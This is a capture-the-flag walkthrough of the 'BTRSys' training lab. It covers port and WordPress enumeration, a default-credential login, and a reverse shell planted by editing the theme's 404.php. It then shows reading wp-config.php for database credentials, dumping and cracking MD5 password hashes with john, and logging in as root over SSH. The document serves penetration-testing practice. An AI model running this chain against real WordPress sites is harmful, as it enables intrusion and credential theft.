# IP : 192.168.188.50

# Enumeration

## NMAP
```javascript
┌──(dx㉿kali)-[~]
└─$ nmap 192.168.188.50                  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 23:26 EDT
Nmap scan report for 192.168.188.50
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.82 seconds
```

## NMAP-ADVANCED
```javascript
┌──(dx㉿kali)-[~]
└─$ nmap -p 21,22,80 -sC -sV 192.168.188.50
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 23:27 EDT
Nmap scan report for 192.168.188.50
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
|_  256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
```

### FINDINGS-FOR-NMAP-SCAN
```javascript
1.PORT-21: WE CAN DO ANONYMOUS FTP LOGIN
2.PORT-80: FROM robots.txt we got one disallowed entry is there "Hackers"
```

# Web-Enumeration

## Port-80
```javascript
Navigating to website
```

![BTRSys-webpage-provingground](https://user-images.githubusercontent.com/98345027/188356694-6623a721-9244-41eb-8f51-84bbf3d9d06e.png)

### Robots-txt Page
![BTRSYS-webpage-robots-page](https://user-images.githubusercontent.com/98345027/188356895-57d7d431-e826-4483-ab89-b56986722c98.png)

### Checking For Disallowed entry: Hackers

![BTRSYS-webpage-robots-page-disallowed-entry](https://user-images.githubusercontent.com/98345027/188357111-edd12367-957b-4df3-9af2-88fa18d27baa.png)

### Checking For Allowed  Entry: /wordpress/

![BTRSys-webpage-wordpress-proving-ground](https://user-images.githubusercontent.com/98345027/188357830-5fd7c6ab-1ca1-42d9-b395-333ca9a2d814.png)



### WpScan
```javascript
┌──(dx㉿kali)-[~]
└─$ wpscan --url http://192.168.188.50/wordpress/ --enumerate at --enumerate ap --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.188.50/wordpress/ [192.168.188.50]
[+] Started: Mon Sep  5 00:33:15 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.188.50/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.188.50/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.188.50/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.188.50/wordpress/?feed=rss2, <generator>http://wordpress.org/?v=3.9.14</generator>
 |  - http://192.168.188.50/wordpress/?feed=comments-rss2, <generator>http://wordpress.org/?v=3.9.14</generator>

[+] WordPress theme in use: twentyfourteen
 | Location: http://192.168.188.50/wordpress/wp-content/themes/twentyfourteen/
 | Latest Version: 3.4
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Style URL: http://192.168.188.50/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] btrisk
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Sep  5 00:34:26 2022
[+] Requests Done: 69
[+] Cached Requests: 6
[+] Data Sent: 17.755 KB
[+] Data Received: 15.86 MB
[+] Memory used: 190.184 MB
[+] Elapsed time: 00:01:10
```



### FINDINGS-FOR-PORT-80
```javascript
## WPSCAN-RESULT ##
1.FOUND 2 USER: btrisk , admin
2. WordPress version 3.9.14 
```

#### Finding the password for the both the user
```javascript
1. Navigate to http://192.168.188.50/wordpress , Down below there is login button clicking on it will redirect to http://192.168.188.50/wordpress/wp-login.php   
2. Now Manually try the default password admin:admin on that login page 
3. After Trying admin:admin we get logged in as "admin" user
```
![wordpress-login-BTRSys](https://user-images.githubusercontent.com/98345027/188364413-39ab3682-7df6-46ae-b1f8-8bac834626ee.png)

### Reverse Shell
```javascript
1.Having authenticated to the application, we can gain an easy reverse shell using Wordpress theme template files.
2.Move to Pentest Monkey(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) copy the php-reverse-shell.php
3.Head over to The ( Dashboard----> Appearance -----> Editor) and select the 404.php. From here we can remove the PHP contents and replace it with our php-reverse-shell.
4.Once Updated we can set a netcat listener and then reload the main page on http://192.168.188.50/wordpress/index.php
```

![NEW-WEBPAGE-REVERSESHELL](https://user-images.githubusercontent.com/98345027/188367891-3db05304-9f61-40cb-af9c-f29798a2d934.png)


## GETTING A SHELL

![GETTING A SHELL](https://user-images.githubusercontent.com/98345027/188368231-b1c0a057-60d0-4ae0-8a53-e8d86aab3ed3.png)
```javascript
1. After getting the shell we have to stabilise the shell by below python code
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```javascript
┌──(dx㉿kali)-[~]
└─$ sudo nc -lvp 80
listening on [any] 80 ...
192.168.188.50: inverse host lookup failed: Unknown host
connect to [192.168.49.188] from (UNKNOWN) [192.168.188.50] 47774
Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 22:56:04 up 8 min,  0 users,  load average: 0.00, 0.03, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/$ whoami
whoami
www-data
www-data@ubuntu:/$ 
```

## GETTING-USER-FLAG
```JAVASCRIPT
www-data@ubuntu:/$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
btrisk
www-data@ubuntu:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root 4096 Mar 17  2017 .
drwxr-xr-x 22 root   root 4096 Feb 20  2020 ..
drwxr-xr-x  4 btrisk 1000 4096 Jul  9  2020 btrisk
www-data@ubuntu:/home$ cd btrisk
cd btrisk
www-data@ubuntu:/home/btrisk$ ls -la
ls -la
total 36
drwxr-xr-x 4 btrisk 1000 4096 Jul  9  2020 .
drwxr-xr-x 3 root   root 4096 Mar 17  2017 ..
-rw------- 1 btrisk 1000    0 Jul  9  2020 .bash_history
-rw-r--r-- 1 btrisk 1000  220 Mar 17  2017 .bash_logout
-rw-r--r-- 1 btrisk 1000 3771 Mar 17  2017 .bashrc
drwx------ 2 btrisk 1000 4096 Mar 17  2017 .cache
-rw------- 1 btrisk 1000    0 Mar  6  2020 .mysql_history
drwxrwxr-x 2 btrisk 1000 4096 Mar 21  2017 .nano
-rw-r--r-- 1 btrisk 1000  655 Mar 17  2017 .profile
-rw-r--r-- 1 btrisk 1000    0 Mar 17  2017 .sudo_as_admin_successful
-rw------- 1 btrisk 1000  586 Mar 21  2017 .viminfo
-rw-r--r-- 1 btrisk 1000   33 Sep  4 22:50 local.txt
www-data@ubuntu:/home/btrisk$ cat local.txt
cat local.txt
7798a13a108c5e7105e8d0935e8cdfcd
www-data@ubuntu:/home/btrisk$ 
```

## ESCALATION


#### CHECKING THE WP-CONTENT.PHP FILE FROM WORDPRESS


```JAVASCRIPT
                                                                              
┌──(dx㉿kali)-[~]
└─$ sudo nc -lvp 80
listening on [any] 80 ...
192.168.188.50: inverse host lookup failed: Unknown host
connect to [192.168.49.188] from (UNKNOWN) [192.168.188.50] 47774
Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 22:56:04 up 8 min,  0 users,  load average: 0.00, 0.03, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/$ whoami
whoami
www-data
www-data@ubuntu:/$ ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
www-data@ubuntu:/$ cd var      
cd var
www-data@ubuntu:/var$ ls    
ls
backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@ubuntu:/var$ cd www
cd www
www-data@ubuntu:/var/www$ ls
ls
html
www-data@ubuntu:/var/www$ cd html
cd html
www-data@ubuntu:/var/www/html$ ls
ls
1.gif        Btrisk2.JPG  INSTALL    hsperfdata_tomcat6  upload
2.gif        CHANGELOG    LICENSE    index.html          wordpress
Btrisk1.JPG  COPYING      README.md  robots.txt
www-data@ubuntu:/var/www/html$ cd wordpress
cd wordpress
www-data@ubuntu:/var/www/html/wordpress$ ls
ls
index.php        wp-blog-header.php    wp-cron.php        wp-mail.php
license.txt      wp-comments-post.php  wp-includes        wp-settings.php
readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php
wp-admin         wp-content            wp-login.php       xmlrpc.php
www-data@ubuntu:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
/** */
define('WP_HOME','/wordpress/');
define('WP_SITEURL','/wordpress/');
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '`47hAs4ic+mLDn[-PH(7t+Q+J)L=8^ 8&z!F ?Tu4H#JlV7Ht4}Fsdbg2us1wZZc');
define('SECURE_AUTH_KEY',  'g#vFXk!k|3,w30.VByn8+D-}-P(]c1oI|&BfmQqq{)5w)B>$?5t}5u&s)#K1@{%d');
define('LOGGED_IN_KEY',    '[|;!?pt}0$ei+>sS9x+B&$iV~N+3Cox-C5zT|,P-<0YsX6-RjNA[WTz-?@<F[O@T');
define('NONCE_KEY',        '7RFLj2-NFkAjb6UsKvnN+1aj<Vm++P9<D~H+)l;|5?P1*?gi%o1&zKaXa<]Ft#++');
define('AUTH_SALT',        'PN9aE9`#7.uL|W8}pGsW$,:h=Af(3h52O!w#IWa|u4zfouV @J@Y_GoC8)ApSKeN');
define('SECURE_AUTH_SALT', 'wGh|W wNR-(p6fRjV?wb$=f4*KkMM<j0)H#Qz-tu.r~2O*Xs9W3^_`c6Md+ptRR.');
define('LOGGED_IN_SALT',   '+36M1E5.MC;-k:[[_bs>~a0o_c$v?ok4LR|17 ]!K:Z8-]lcSs?EXC`TO;X3in[#');
define('NONCE_SALT',       'K=Sf5{EDu3rG&x=#em=R}:-m+IRNs<@4e8P*)GF#+x+,zu.D8Ksy?j+_]/Kcn|cn');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

www-data@ubuntu:/var/www/html/wordpress$ 

```

#### FINDINGS-DATABASE USER
```PYTHON
DATABASE USER:root
password: rootpassword
```

### MYSQL ENUMERATION
```python
using the discovered credentials, we can now see what is inside the local database. Let's list the available tables inside the wordpress database:
```
```javascript

www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p -D wordpress -e 'SHOW TABLES;'
<ml/wordpress$ mysql -u root -p -D wordpress -e 'SHOW TABLES;'               
Enter password: rootpassword!

+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_abtest_experiments      |
| wp_abtest_goal_hits        |
| wp_abtest_goals            |
| wp_abtest_ip_filters       |
| wp_abtest_variation_views  |
| wp_abtest_variations       |
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_masta_campaign          |
| wp_masta_cronapi           |
| wp_masta_list              |
| wp_masta_reports           |
| wp_masta_responder         |
| wp_masta_responder_reports |
| wp_masta_settings          |
| wp_masta_subscribers       |
| wp_masta_support           |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
```
```python
User tables are always interesting to enumerate. Inside the wp_users table, we find a couple of records:
```

```python
www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p -D wordpress -e 'SELECT * FROM wp_users;'
<ml/wordpress$ mysql -u root -p -D wordpress -e 'SELECT * FROM wp_users;'    
Enter password: rootpassword!

+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       |
|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
```
### Findings from User-table
```python
We find two users here: root and admin, and their passwords were hashed
root: a318e4507e5a74604aafb45e4741edd3
admin: 21232f297a57a5a743894a0e4a801fc3
```

## Password hash Cracking for root user
```python
1. first save the hash in afile called hash
2. Then use john to crack the password by the following command
3.Command: john --format=raw-MD5 hash 
4 aLTERNATIVELY WE CAN CRACH THE HASH BY USING (https://crackstation.net/)
```
![HAHS CRACKER](https://user-images.githubusercontent.com/98345027/188377248-5496924d-c281-41a3-a514-a10fb4a247f3.png)

```python
──(dx㉿kali)-[~]
└─$ john --format=raw-MD5 hash                            
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
roottoor         (?)     
1g 0:00:01:08 DONE 3/3 (2022-09-05 02:14) 0.01469g/s 50033Kp/s 50033Kc/s 50033KC/s roottim2..roott11e
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

```javascript
The password found for root is : roottoor 
```

## SSH
```javascript
1.Now we know the passsowrd of the root user just simply ssh
=================================================================
                                                                                                                                                 
┌──(dx㉿kali)-[~]
└─$ ssh root@192.168.188.50
root@192.168.188.50's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Jul  9 07:32:53 2020 from 192.168.118.8
root@ubuntu:~# 


```
